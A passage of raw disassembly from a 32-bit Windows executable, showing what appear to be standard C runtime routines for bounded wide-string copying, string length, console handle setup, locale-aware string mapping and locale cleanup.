  408564:	4f                   	dec    %edi
  408565:	75 f4                	jne    0x40855b
  408567:	85 ff                	test   %edi,%edi
  408569:	74 e7                	je     0x408552
  40856b:	2b d1                	sub    %ecx,%edx
  40856d:	0f b7 01             	movzwl (%ecx),%eax
  408570:	66 89 04 0a          	mov    %ax,(%edx,%ecx,1)
  408574:	83 c1 02             	add    $0x2,%ecx
  408577:	66 85 c0             	test   %ax,%ax
  40857a:	74 03                	je     0x40857f
  40857c:	4f                   	dec    %edi
  40857d:	75 ee                	jne    0x40856d
  40857f:	33 c0                	xor    %eax,%eax
  408581:	85 ff                	test   %edi,%edi
  408583:	75 c2                	jne    0x408547
  408585:	66 89 06             	mov    %ax,(%esi)
  408588:	e8 20 bd ff ff       	call   0x4042ad
  40858d:	6a 22                	push   $0x22
  40858f:	59                   	pop    %ecx
  408590:	89 08                	mov    %ecx,(%eax)
  408592:	8b f1                	mov    %ecx,%esi
  408594:	eb aa                	jmp    0x408540
  408596:	8b ff                	mov    %edi,%edi
  408598:	55                   	push   %ebp
  408599:	8b ec                	mov    %esp,%ebp
  40859b:	8b 55 08             	mov    0x8(%ebp),%edx
  40859e:	53                   	push   %ebx
  40859f:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4085a2:	56                   	push   %esi
  4085a3:	57                   	push   %edi
  4085a4:	85 db                	test   %ebx,%ebx
  4085a6:	75 10                	jne    0x4085b8
  4085a8:	85 d2                	test   %edx,%edx
  4085aa:	75 10                	jne    0x4085bc
  4085ac:	39 55 0c             	cmp    %edx,0xc(%ebp)
  4085af:	75 12                	jne    0x4085c3
  4085b1:	33 c0                	xor    %eax,%eax
  4085b3:	5f                   	pop    %edi
  4085b4:	5e                   	pop    %esi
  4085b5:	5b                   	pop    %ebx
  4085b6:	5d                   	pop    %ebp
  4085b7:	c3                   	ret
  4085b8:	85 d2                	test   %edx,%edx
  4085ba:	74 07                	je     0x4085c3
  4085bc:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4085bf:	85 ff                	test   %edi,%edi
  4085c1:	75 13                	jne    0x4085d6
  4085c3:	e8 e5 bc ff ff       	call   0x4042ad
  4085c8:	6a 16                	push   $0x16
  4085ca:	5e                   	pop    %esi
  4085cb:	89 30                	mov    %esi,(%eax)
  4085cd:	e8 89 bc ff ff       	call   0x40425b
  4085d2:	8b c6                	mov    %esi,%eax
  4085d4:	eb dd                	jmp    0x4085b3
  4085d6:	85 db                	test   %ebx,%ebx
  4085d8:	75 07                	jne    0x4085e1
  4085da:	33 c0                	xor    %eax,%eax
  4085dc:	66 89 02             	mov    %ax,(%edx)
  4085df:	eb d0                	jmp    0x4085b1
  4085e1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4085e4:	85 c9                	test   %ecx,%ecx
  4085e6:	75 07                	jne    0x4085ef
  4085e8:	33 c0                	xor    %eax,%eax
  4085ea:	66 89 02             	mov    %ax,(%edx)
  4085ed:	eb d4                	jmp    0x4085c3
  4085ef:	8b c2                	mov    %edx,%eax
  4085f1:	83 fb ff             	cmp    $0xffffffff,%ebx
  4085f4:	75 18                	jne    0x40860e
  4085f6:	8b f2                	mov    %edx,%esi
  4085f8:	2b f1                	sub    %ecx,%esi
  4085fa:	0f b7 01             	movzwl (%ecx),%eax
  4085fd:	66 89 04 0e          	mov    %ax,(%esi,%ecx,1)
  408601:	83 c1 02             	add    $0x2,%ecx
  408604:	66 85 c0             	test   %ax,%ax
  408607:	74 27                	je     0x408630
  408609:	4f                   	dec    %edi
  40860a:	75 ee                	jne    0x4085fa
  40860c:	eb 22                	jmp    0x408630
  40860e:	8b f1                	mov    %ecx,%esi
  408610:	2b f2                	sub    %edx,%esi
  408612:	0f b7 0c 06          	movzwl (%esi,%eax,1),%ecx
  408616:	66 89 08             	mov    %cx,(%eax)
  408619:	83 c0 02             	add    $0x2,%eax
  40861c:	66 85 c9             	test   %cx,%cx
  40861f:	74 06                	je     0x408627
  408621:	4f                   	dec    %edi
  408622:	74 03                	je     0x408627
  408624:	4b                   	dec    %ebx
  408625:	75 eb                	jne    0x408612
  408627:	85 db                	test   %ebx,%ebx
  408629:	75 05                	jne    0x408630
  40862b:	33 c9                	xor    %ecx,%ecx
  40862d:	66 89 08             	mov    %cx,(%eax)
  408630:	85 ff                	test   %edi,%edi
  408632:	0f 85 79 ff ff ff    	jne    0x4085b1
  408638:	33 c0                	xor    %eax,%eax
  40863a:	83 fb ff             	cmp    $0xffffffff,%ebx
  40863d:	75 10                	jne    0x40864f
  40863f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408642:	6a 50                	push   $0x50
  408644:	66 89 44 4a fe       	mov    %ax,-0x2(%edx,%ecx,2)
  408649:	58                   	pop    %eax
  40864a:	e9 64 ff ff ff       	jmp    0x4085b3
  40864f:	66 89 02             	mov    %ax,(%edx)
  408652:	e8 56 bc ff ff       	call   0x4042ad
  408657:	6a 22                	push   $0x22
  408659:	59                   	pop    %ecx
  40865a:	89 08                	mov    %ecx,(%eax)
  40865c:	8b f1                	mov    %ecx,%esi
  40865e:	e9 6a ff ff ff       	jmp    0x4085cd
  408663:	8b ff                	mov    %edi,%edi
  408665:	55                   	push   %ebp
  408666:	8b ec                	mov    %esp,%ebp
  408668:	8b 45 08             	mov    0x8(%ebp),%eax
  40866b:	66 8b 08             	mov    (%eax),%cx
  40866e:	83 c0 02             	add    $0x2,%eax
  408671:	66 85 c9             	test   %cx,%cx
  408674:	75 f5                	jne    0x40866b
  408676:	2b 45 08             	sub    0x8(%ebp),%eax
  408679:	d1 f8                	sar    $1,%eax
  40867b:	48                   	dec    %eax
  40867c:	5d                   	pop    %ebp
  40867d:	c3                   	ret
  40867e:	8b ff                	mov    %edi,%edi
  408680:	55                   	push   %ebp
  408681:	8b ec                	mov    %esp,%ebp
  408683:	56                   	push   %esi
  408684:	8b 75 08             	mov    0x8(%ebp),%esi
  408687:	57                   	push   %edi
  408688:	85 f6                	test   %esi,%esi
  40868a:	74 07                	je     0x408693
  40868c:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40868f:	85 ff                	test   %edi,%edi
  408691:	75 15                	jne    0x4086a8
  408693:	e8 15 bc ff ff       	call   0x4042ad
  408698:	6a 16                	push   $0x16
  40869a:	5e                   	pop    %esi
  40869b:	89 30                	mov    %esi,(%eax)
  40869d:	e8 b9 bb ff ff       	call   0x40425b
  4086a2:	8b c6                	mov    %esi,%eax
  4086a4:	5f                   	pop    %edi
  4086a5:	5e                   	pop    %esi
  4086a6:	5d                   	pop    %ebp
  4086a7:	c3                   	ret
  4086a8:	8b 45 10             	mov    0x10(%ebp),%eax
  4086ab:	85 c0                	test   %eax,%eax
  4086ad:	75 05                	jne    0x4086b4
  4086af:	66 89 06             	mov    %ax,(%esi)
  4086b2:	eb df                	jmp    0x408693
  4086b4:	8b d6                	mov    %esi,%edx
  4086b6:	2b d0                	sub    %eax,%edx
  4086b8:	0f b7 08             	movzwl (%eax),%ecx
  4086bb:	66 89 0c 02          	mov    %cx,(%edx,%eax,1)
  4086bf:	83 c0 02             	add    $0x2,%eax
  4086c2:	66 85 c9             	test   %cx,%cx
  4086c5:	74 03                	je     0x4086ca
  4086c7:	4f                   	dec    %edi
  4086c8:	75 ee                	jne    0x4086b8
  4086ca:	33 c0                	xor    %eax,%eax
  4086cc:	85 ff                	test   %edi,%edi
  4086ce:	75 d4                	jne    0x4086a4
  4086d0:	66 89 06             	mov    %ax,(%esi)
  4086d3:	e8 d5 bb ff ff       	call   0x4042ad
  4086d8:	6a 22                	push   $0x22
  4086da:	59                   	pop    %ecx
  4086db:	89 08                	mov    %ecx,(%eax)
  4086dd:	8b f1                	mov    %ecx,%esi
  4086df:	eb bc                	jmp    0x40869d
  4086e1:	8b ff                	mov    %edi,%edi
  4086e3:	55                   	push   %ebp
  4086e4:	8b ec                	mov    %esp,%ebp
  4086e6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4086e9:	85 c9                	test   %ecx,%ecx
  4086eb:	78 1e                	js     0x40870b
  4086ed:	83 f9 02             	cmp    $0x2,%ecx
  4086f0:	7e 0c                	jle    0x4086fe
  4086f2:	83 f9 03             	cmp    $0x3,%ecx
  4086f5:	75 14                	jne    0x40870b
  4086f7:	a1 3c 08 41 00       	mov    0x41083c,%eax
  4086fc:	5d                   	pop    %ebp
  4086fd:	c3                   	ret
  4086fe:	a1 3c 08 41 00       	mov    0x41083c,%eax
  408703:	89 0d 3c 08 41 00    	mov    %ecx,0x41083c
  408709:	5d                   	pop    %ebp
  40870a:	c3                   	ret
  40870b:	e8 9d bb ff ff       	call   0x4042ad
  408710:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408716:	e8 40 bb ff ff       	call   0x40425b
  40871b:	83 c8 ff             	or     $0xffffffff,%eax
  40871e:	5d                   	pop    %ebp
  40871f:	c3                   	ret
  408720:	e8 65 e7 ff ff       	call   0x406e8a
  408725:	85 c0                	test   %eax,%eax
  408727:	74 08                	je     0x408731
  408729:	6a 16                	push   $0x16
  40872b:	e8 67 e7 ff ff       	call   0x406e97
  408730:	59                   	pop    %ecx
  408731:	f6 05 e4 fd 40 00 02 	testb  $0x2,0x40fde4
  408738:	74 11                	je     0x40874b
  40873a:	6a 01                	push   $0x1
  40873c:	68 15 00 00 40       	push   $0x40000015
  408741:	6a 03                	push   $0x3
  408743:	e8 98 b9 ff ff       	call   0x4040e0
  408748:	83 c4 0c             	add    $0xc,%esp
  40874b:	6a 03                	push   $0x3
  40874d:	e8 1e c3 ff ff       	call   0x404a70
  408752:	cc                   	int3
  408753:	8b ff                	mov    %edi,%edi
  408755:	55                   	push   %ebp
  408756:	8b ec                	mov    %esp,%ebp
  408758:	8b 45 08             	mov    0x8(%ebp),%eax
  40875b:	85 c0                	test   %eax,%eax
  40875d:	74 12                	je     0x408771
  40875f:	83 e8 08             	sub    $0x8,%eax
  408762:	81 38 dd dd 00 00    	cmpl   $0xdddd,(%eax)
  408768:	75 07                	jne    0x408771
  40876a:	50                   	push   %eax
  40876b:	e8 3b b4 ff ff       	call   0x403bab
  408770:	59                   	pop    %ecx
  408771:	5d                   	pop    %ebp
  408772:	c3                   	ret
  408773:	6a 02                	push   $0x2
  408775:	e8 2a c3 ff ff       	call   0x404aa4
  40877a:	59                   	pop    %ecx
  40877b:	c3                   	ret
  40877c:	33 c0                	xor    %eax,%eax
  40877e:	50                   	push   %eax
  40877f:	50                   	push   %eax
  408780:	6a 03                	push   $0x3
  408782:	50                   	push   %eax
  408783:	6a 03                	push   $0x3
  408785:	68 00 00 00 40       	push   $0x40000000
  40878a:	68 90 ca 40 00       	push   $0x40ca90
  40878f:	ff 15 d8 b0 40 00    	call   *0x40b0d8
  408795:	a3 ec fe 40 00       	mov    %eax,0x40feec
  40879a:	c3                   	ret
  40879b:	a1 ec fe 40 00       	mov    0x40feec,%eax
  4087a0:	83 f8 ff             	cmp    $0xffffffff,%eax
  4087a3:	74 0c                	je     0x4087b1
  4087a5:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4087a8:	74 07                	je     0x4087b1
  4087aa:	50                   	push   %eax
  4087ab:	ff 15 dc b0 40 00    	call   *0x40b0dc
  4087b1:	c3                   	ret
  4087b2:	8b ff                	mov    %edi,%edi
  4087b4:	55                   	push   %ebp
  4087b5:	8b ec                	mov    %esp,%ebp
  4087b7:	83 ec 10             	sub    $0x10,%esp
  4087ba:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4087bf:	33 c5                	xor    %ebp,%eax
  4087c1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4087c4:	8b 55 18             	mov    0x18(%ebp),%edx
  4087c7:	53                   	push   %ebx
  4087c8:	33 db                	xor    %ebx,%ebx
  4087ca:	56                   	push   %esi
  4087cb:	57                   	push   %edi
  4087cc:	3b d3                	cmp    %ebx,%edx
  4087ce:	7e 1f                	jle    0x4087ef
  4087d0:	8b 45 14             	mov    0x14(%ebp),%eax
  4087d3:	8b ca                	mov    %edx,%ecx
  4087d5:	49                   	dec    %ecx
  4087d6:	38 18                	cmp    %bl,(%eax)
  4087d8:	74 08                	je     0x4087e2
  4087da:	40                   	inc    %eax
  4087db:	3b cb                	cmp    %ebx,%ecx
  4087dd:	75 f6                	jne    0x4087d5
  4087df:	83 c9 ff             	or     $0xffffffff,%ecx
  4087e2:	8b c2                	mov    %edx,%eax
  4087e4:	2b c1                	sub    %ecx,%eax
  4087e6:	48                   	dec    %eax
  4087e7:	3b c2                	cmp    %edx,%eax
  4087e9:	7d 01                	jge    0x4087ec
  4087eb:	40                   	inc    %eax
  4087ec:	89 45 18             	mov    %eax,0x18(%ebp)
  4087ef:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4087f2:	39 5d 24             	cmp    %ebx,0x24(%ebp)
  4087f5:	75 0b                	jne    0x408802
  4087f7:	8b 45 08             	mov    0x8(%ebp),%eax
  4087fa:	8b 00                	mov    (%eax),%eax
  4087fc:	8b 40 04             	mov    0x4(%eax),%eax
  4087ff:	89 45 24             	mov    %eax,0x24(%ebp)
  408802:	8b 35 b4 b0 40 00    	mov    0x40b0b4,%esi
  408808:	33 c0                	xor    %eax,%eax
  40880a:	39 5d 28             	cmp    %ebx,0x28(%ebp)
  40880d:	53                   	push   %ebx
  40880e:	53                   	push   %ebx
  40880f:	ff 75 18             	push   0x18(%ebp)
  408812:	0f 95 c0             	setne  %al
  408815:	ff 75 14             	push   0x14(%ebp)
  408818:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  40881f:	50                   	push   %eax
  408820:	ff 75 24             	push   0x24(%ebp)
  408823:	ff d6                	call   *%esi
  408825:	8b f8                	mov    %eax,%edi
  408827:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40882a:	3b fb                	cmp    %ebx,%edi
  40882c:	75 07                	jne    0x408835
  40882e:	33 c0                	xor    %eax,%eax
  408830:	e9 52 01 00 00       	jmp    0x408987
  408835:	7e 43                	jle    0x40887a
  408837:	6a e0                	push   $0xffffffe0
  408839:	33 d2                	xor    %edx,%edx
  40883b:	58                   	pop    %eax
  40883c:	f7 f7                	div    %edi
  40883e:	83 f8 02             	cmp    $0x2,%eax
  408841:	72 37                	jb     0x40887a
  408843:	8d 44 3f 08          	lea    0x8(%edi,%edi,1),%eax
  408847:	3d 00 04 00 00       	cmp    $0x400,%eax
  40884c:	77 13                	ja     0x408861
  40884e:	e8 6d 08 00 00       	call   0x4090c0
  408853:	8b c4                	mov    %esp,%eax
  408855:	3b c3                	cmp    %ebx,%eax
  408857:	74 1c                	je     0x408875
  408859:	c7 00 cc cc 00 00    	movl   $0xcccc,(%eax)
  40885f:	eb 11                	jmp    0x408872
  408861:	50                   	push   %eax
  408862:	e8 f0 bb ff ff       	call   0x404457
  408867:	59                   	pop    %ecx
  408868:	3b c3                	cmp    %ebx,%eax
  40886a:	74 09                	je     0x408875
  40886c:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  408872:	83 c0 08             	add    $0x8,%eax
  408875:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408878:	eb 03                	jmp    0x40887d
  40887a:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40887d:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  408880:	74 ac                	je     0x40882e
  408882:	57                   	push   %edi
  408883:	ff 75 f4             	push   -0xc(%ebp)
  408886:	ff 75 18             	push   0x18(%ebp)
  408889:	ff 75 14             	push   0x14(%ebp)
  40888c:	6a 01                	push   $0x1
  40888e:	ff 75 24             	push   0x24(%ebp)
  408891:	ff d6                	call   *%esi
  408893:	85 c0                	test   %eax,%eax
  408895:	0f 84 e0 00 00 00    	je     0x40897b
  40889b:	8b 35 8c b1 40 00    	mov    0x40b18c,%esi
  4088a1:	53                   	push   %ebx
  4088a2:	53                   	push   %ebx
  4088a3:	57                   	push   %edi
  4088a4:	ff 75 f4             	push   -0xc(%ebp)
  4088a7:	ff 75 10             	push   0x10(%ebp)
  4088aa:	ff 75 0c             	push   0xc(%ebp)
  4088ad:	ff d6                	call   *%esi
  4088af:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4088b2:	3b c3                	cmp    %ebx,%eax
  4088b4:	0f 84 c1 00 00 00    	je     0x40897b
  4088ba:	b9 00 04 00 00       	mov    $0x400,%ecx
  4088bf:	85 4d 10             	test   %ecx,0x10(%ebp)
  4088c2:	74 29                	je     0x4088ed
  4088c4:	8b 45 20             	mov    0x20(%ebp),%eax
  4088c7:	3b c3                	cmp    %ebx,%eax
  4088c9:	0f 84 ac 00 00 00    	je     0x40897b
  4088cf:	39 45 f8             	cmp    %eax,-0x8(%ebp)
  4088d2:	0f 8f a3 00 00 00    	jg     0x40897b
  4088d8:	50                   	push   %eax
  4088d9:	ff 75 1c             	push   0x1c(%ebp)
  4088dc:	57                   	push   %edi
  4088dd:	ff 75 f4             	push   -0xc(%ebp)
  4088e0:	ff 75 10             	push   0x10(%ebp)
  4088e3:	ff 75 0c             	push   0xc(%ebp)
  4088e6:	ff d6                	call   *%esi
  4088e8:	e9 8e 00 00 00       	jmp    0x40897b
  4088ed:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4088f0:	3b fb                	cmp    %ebx,%edi
  4088f2:	7e 42                	jle    0x408936
  4088f4:	6a e0                	push   $0xffffffe0
  4088f6:	33 d2                	xor    %edx,%edx
  4088f8:	58                   	pop    %eax
  4088f9:	f7 f7                	div    %edi
  4088fb:	83 f8 02             	cmp    $0x2,%eax
  4088fe:	72 36                	jb     0x408936
  408900:	8d 44 3f 08          	lea    0x8(%edi,%edi,1),%eax
  408904:	3b c1                	cmp    %ecx,%eax
  408906:	77 16                	ja     0x40891e
  408908:	e8 b3 07 00 00       	call   0x4090c0
  40890d:	8b fc                	mov    %esp,%edi
  40890f:	3b fb                	cmp    %ebx,%edi
  408911:	74 68                	je     0x40897b
  408913:	c7 07 cc cc 00 00    	movl   $0xcccc,(%edi)
  408919:	83 c7 08             	add    $0x8,%edi
  40891c:	eb 1a                	jmp    0x408938
  40891e:	50                   	push   %eax
  40891f:	e8 33 bb ff ff       	call   0x404457
  408924:	59                   	pop    %ecx
  408925:	3b c3                	cmp    %ebx,%eax
  408927:	74 09                	je     0x408932
  408929:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  40892f:	83 c0 08             	add    $0x8,%eax
  408932:	8b f8                	mov    %eax,%edi
  408934:	eb 02                	jmp    0x408938
  408936:	33 ff                	xor    %edi,%edi
  408938:	3b fb                	cmp    %ebx,%edi
  40893a:	74 3f                	je     0x40897b
  40893c:	ff 75 f8             	push   -0x8(%ebp)
  40893f:	57                   	push   %edi
  408940:	ff 75 f0             	push   -0x10(%ebp)
  408943:	ff 75 f4             	push   -0xc(%ebp)
  408946:	ff 75 10             	push   0x10(%ebp)
  408949:	ff 75 0c             	push   0xc(%ebp)
  40894c:	ff d6                	call   *%esi
  40894e:	85 c0                	test   %eax,%eax
  408950:	74 22                	je     0x408974
  408952:	53                   	push   %ebx
  408953:	53                   	push   %ebx
  408954:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  408957:	75 04                	jne    0x40895d
  408959:	53                   	push   %ebx
  40895a:	53                   	push   %ebx
  40895b:	eb 06                	jmp    0x408963
  40895d:	ff 75 20             	push   0x20(%ebp)
  408960:	ff 75 1c             	push   0x1c(%ebp)
  408963:	ff 75 f8             	push   -0x8(%ebp)
  408966:	57                   	push   %edi
  408967:	53                   	push   %ebx
  408968:	ff 75 24             	push   0x24(%ebp)
  40896b:	ff 15 b0 b0 40 00    	call   *0x40b0b0
  408971:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408974:	57                   	push   %edi
  408975:	e8 d9 fd ff ff       	call   0x408753
  40897a:	59                   	pop    %ecx
  40897b:	ff 75 f4             	push   -0xc(%ebp)
  40897e:	e8 d0 fd ff ff       	call   0x408753
  408983:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408986:	59                   	pop    %ecx
  408987:	8d 65 e4             	lea    -0x1c(%ebp),%esp
  40898a:	5f                   	pop    %edi
  40898b:	5e                   	pop    %esi
  40898c:	5b                   	pop    %ebx
  40898d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408990:	33 cd                	xor    %ebp,%ecx
  408992:	e8 e7 a6 ff ff       	call   0x40307e
  408997:	c9                   	leave
  408998:	c3                   	ret
  408999:	8b ff                	mov    %edi,%edi
  40899b:	55                   	push   %ebp
  40899c:	8b ec                	mov    %esp,%ebp
  40899e:	83 ec 10             	sub    $0x10,%esp
  4089a1:	ff 75 08             	push   0x8(%ebp)
  4089a4:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4089a7:	e8 31 d1 ff ff       	call   0x405add
  4089ac:	ff 75 28             	push   0x28(%ebp)
  4089af:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4089b2:	ff 75 24             	push   0x24(%ebp)
  4089b5:	ff 75 20             	push   0x20(%ebp)
  4089b8:	ff 75 1c             	push   0x1c(%ebp)
  4089bb:	ff 75 18             	push   0x18(%ebp)
  4089be:	ff 75 14             	push   0x14(%ebp)
  4089c1:	ff 75 10             	push   0x10(%ebp)
  4089c4:	ff 75 0c             	push   0xc(%ebp)
  4089c7:	50                   	push   %eax
  4089c8:	e8 e5 fd ff ff       	call   0x4087b2
  4089cd:	83 c4 24             	add    $0x24,%esp
  4089d0:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  4089d4:	74 07                	je     0x4089dd
  4089d6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4089d9:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  4089dd:	c9                   	leave
  4089de:	c3                   	ret
  4089df:	8b ff                	mov    %edi,%edi
  4089e1:	55                   	push   %ebp
  4089e2:	8b ec                	mov    %esp,%ebp
  4089e4:	51                   	push   %ecx
  4089e5:	51                   	push   %ecx
  4089e6:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4089eb:	33 c5                	xor    %ebp,%eax
  4089ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4089f0:	53                   	push   %ebx
  4089f1:	33 db                	xor    %ebx,%ebx
  4089f3:	56                   	push   %esi
  4089f4:	57                   	push   %edi
  4089f5:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4089f8:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  4089fb:	75 0b                	jne    0x408a08
  4089fd:	8b 45 08             	mov    0x8(%ebp),%eax
  408a00:	8b 00                	mov    (%eax),%eax
  408a02:	8b 40 04             	mov    0x4(%eax),%eax
  408a05:	89 45 1c             	mov    %eax,0x1c(%ebp)
  408a08:	8b 35 b4 b0 40 00    	mov    0x40b0b4,%esi
  408a0e:	33 c0                	xor    %eax,%eax
  408a10:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  408a13:	53                   	push   %ebx
  408a14:	53                   	push   %ebx
  408a15:	ff 75 14             	push   0x14(%ebp)
  408a18:	0f 95 c0             	setne  %al
  408a1b:	ff 75 10             	push   0x10(%ebp)
  408a1e:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  408a25:	50                   	push   %eax
  408a26:	ff 75 1c             	push   0x1c(%ebp)
  408a29:	ff d6                	call   *%esi
  408a2b:	8b f8                	mov    %eax,%edi
  408a2d:	3b fb                	cmp    %ebx,%edi
  408a2f:	75 04                	jne    0x408a35
  408a31:	33 c0                	xor    %eax,%eax
  408a33:	eb 7f                	jmp    0x408ab4
  408a35:	7e 3c                	jle    0x408a73
  408a37:	81 ff f0 ff ff 7f    	cmp    $0x7ffffff0,%edi
  408a3d:	77 34                	ja     0x408a73
  408a3f:	8d 44 3f 08          	lea    0x8(%edi,%edi,1),%eax
  408a43:	3d 00 04 00 00       	cmp    $0x400,%eax
  408a48:	77 13                	ja     0x408a5d
  408a4a:	e8 71 06 00 00       	call   0x4090c0
  408a4f:	8b c4                	mov    %esp,%eax
  408a51:	3b c3                	cmp    %ebx,%eax
  408a53:	74 1c                	je     0x408a71
  408a55:	c7 00 cc cc 00 00    	movl   $0xcccc,(%eax)
  408a5b:	eb 11                	jmp    0x408a6e
  408a5d:	50                   	push   %eax
  408a5e:	e8 f4 b9 ff ff       	call   0x404457
  408a63:	59                   	pop    %ecx
  408a64:	3b c3                	cmp    %ebx,%eax
  408a66:	74 09                	je     0x408a71
  408a68:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  408a6e:	83 c0 08             	add    $0x8,%eax
  408a71:	8b d8                	mov    %eax,%ebx
  408a73:	85 db                	test   %ebx,%ebx
  408a75:	74 ba                	je     0x408a31
  408a77:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  408a7a:	50                   	push   %eax
  408a7b:	6a 00                	push   $0x0
  408a7d:	53                   	push   %ebx
  408a7e:	e8 6d b1 ff ff       	call   0x403bf0
  408a83:	83 c4 0c             	add    $0xc,%esp
  408a86:	57                   	push   %edi
  408a87:	53                   	push   %ebx
  408a88:	ff 75 14             	push   0x14(%ebp)
  408a8b:	ff 75 10             	push   0x10(%ebp)
  408a8e:	6a 01                	push   $0x1
  408a90:	ff 75 1c             	push   0x1c(%ebp)
  408a93:	ff d6                	call   *%esi
  408a95:	85 c0                	test   %eax,%eax
  408a97:	74 11                	je     0x408aaa
  408a99:	ff 75 18             	push   0x18(%ebp)
  408a9c:	50                   	push   %eax
  408a9d:	53                   	push   %ebx
  408a9e:	ff 75 0c             	push   0xc(%ebp)
  408aa1:	ff 15 88 b1 40 00    	call   *0x40b188
  408aa7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408aaa:	53                   	push   %ebx
  408aab:	e8 a3 fc ff ff       	call   0x408753
  408ab0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408ab3:	59                   	pop    %ecx
  408ab4:	8d 65 ec             	lea    -0x14(%ebp),%esp
  408ab7:	5f                   	pop    %edi
  408ab8:	5e                   	pop    %esi
  408ab9:	5b                   	pop    %ebx
  408aba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408abd:	33 cd                	xor    %ebp,%ecx
  408abf:	e8 ba a5 ff ff       	call   0x40307e
  408ac4:	c9                   	leave
  408ac5:	c3                   	ret
  408ac6:	8b ff                	mov    %edi,%edi
  408ac8:	55                   	push   %ebp
  408ac9:	8b ec                	mov    %esp,%ebp
  408acb:	83 ec 10             	sub    $0x10,%esp
  408ace:	ff 75 08             	push   0x8(%ebp)
  408ad1:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408ad4:	e8 04 d0 ff ff       	call   0x405add
  408ad9:	ff 75 24             	push   0x24(%ebp)
  408adc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408adf:	ff 75 1c             	push   0x1c(%ebp)
  408ae2:	ff 75 18             	push   0x18(%ebp)
  408ae5:	ff 75 14             	push   0x14(%ebp)
  408ae8:	ff 75 10             	push   0x10(%ebp)
  408aeb:	ff 75 0c             	push   0xc(%ebp)
  408aee:	50                   	push   %eax
  408aef:	e8 eb fe ff ff       	call   0x4089df
  408af4:	83 c4 1c             	add    $0x1c,%esp
  408af7:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  408afb:	74 07                	je     0x408b04
  408afd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408b00:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  408b04:	c9                   	leave
  408b05:	c3                   	ret
  408b06:	8b ff                	mov    %edi,%edi
  408b08:	55                   	push   %ebp
  408b09:	8b ec                	mov    %esp,%ebp
  408b0b:	56                   	push   %esi
  408b0c:	8b 75 08             	mov    0x8(%ebp),%esi
  408b0f:	85 f6                	test   %esi,%esi
  408b11:	0f 84 63 03 00 00    	je     0x408e7a
  408b17:	ff 76 04             	push   0x4(%esi)
  408b1a:	e8 8c b0 ff ff       	call   0x403bab
  408b1f:	ff 76 08             	push   0x8(%esi)
  408b22:	e8 84 b0 ff ff       	call   0x403bab
  408b27:	ff 76 0c             	push   0xc(%esi)
  408b2a:	e8 7c b0 ff ff       	call   0x403bab
  408b2f:	ff 76 10             	push   0x10(%esi)
  408b32:	e8 74 b0 ff ff       	call   0x403bab
  408b37:	ff 76 14             	push   0x14(%esi)
  408b3a:	e8 6c b0 ff ff       	call   0x403bab
  408b3f:	ff 76 18             	push   0x18(%esi)
  408b42:	e8 64 b0 ff ff       	call   0x403bab
  408b47:	ff 36                	push   (%esi)
  408b49:	e8 5d b0 ff ff       	call   0x403bab
  408b4e:	ff 76 20             	push   0x20(%esi)
  408b51:	e8 55 b0 ff ff       	call   0x403bab
  408b56:	ff 76 24             	push   0x24(%esi)
  408b59:	e8 4d b0 ff ff       	call   0x403bab
  408b5e:	ff 76 28             	push   0x28(%esi)
  408b61:	e8 45 b0 ff ff       	call   0x403bab
  408b66:	ff 76 2c             	push   0x2c(%esi)
  408b69:	e8 3d b0 ff ff       	call   0x403bab
  408b6e:	ff 76 30             	push   0x30(%esi)
  408b71:	e8 35 b0 ff ff       	call   0x403bab
  408b76:	ff 76 34             	push   0x34(%esi)
  408b79:	e8 2d b0 ff ff       	call   0x403bab
  408b7e:	ff 76 1c             	push   0x1c(%esi)
  408b81:	e8 25 b0 ff ff       	call   0x403bab
  408b86:	ff 76 38             	push   0x38(%esi)
  408b89:	e8 1d b0 ff ff       	call   0x403bab
  408b8e:	ff 76 3c             	push   0x3c(%esi)
  408b91:	e8 15 b0 ff ff       	call   0x403bab
  408b96:	83 c4 40             	add    $0x40,%esp
  408b99:	ff 76 40             	push   0x40(%esi)
  408b9c:	e8 0a b0 ff ff       	call   0x403bab
  408ba1:	ff 76 44             	push   0x44(%esi)
  408ba4:	e8 02 b0 ff ff       	call   0x403bab
  408ba9:	ff 76 48             	push   0x48(%esi)
  408bac:	e8 fa af ff ff       	call   0x403bab
